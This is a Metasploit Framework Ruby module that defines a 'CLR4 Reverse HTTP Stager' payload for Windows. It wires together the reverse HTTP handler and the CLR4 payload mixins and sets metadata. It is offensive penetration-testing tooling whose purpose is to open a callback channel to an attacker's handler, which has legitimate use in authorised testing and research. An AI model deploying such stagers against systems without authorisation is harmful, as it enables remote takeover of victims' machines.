##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/clr4/reverse_http'

module MetasploitModule

  CachedSize = 414

  include Msf::Payload::Stager
  include Msf::Payload::Clr4::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'CLR4 Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP (CLR4)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CLR4,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'http'
    ))
  end
end
